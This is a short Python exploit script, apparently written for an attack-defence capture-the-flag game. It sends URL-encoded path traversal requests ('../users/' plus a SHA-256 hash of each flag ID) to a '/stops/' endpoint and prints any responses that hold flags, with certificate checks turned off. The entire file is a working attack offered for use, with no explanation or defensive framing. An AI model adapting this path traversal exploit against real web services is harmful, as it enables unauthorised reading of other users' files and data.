from pwn import *
from hashlib import sha256
import requests

port = 8000

def exploit(target, flag_ids):
    ids=flag_ids.split(",")
    for flag_id in ids:
        h = (sha256(flag_id.encode('utf-8')).hexdigest())
        payload = f"%2E%2E%2Fusers%2F{h}"
        r = requests.get(f"https://{target}:{port}/stops/{payload}", verify=False)
        print(r.text)
        if 'SAAR{' not in r.text:
            r = requests.post(f"https://{target}:{port}/stops/{payload}", data={'comment': 'pwn'}, verify=False)
            print(r.text)


if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else 'localhost', sys.argv[2])
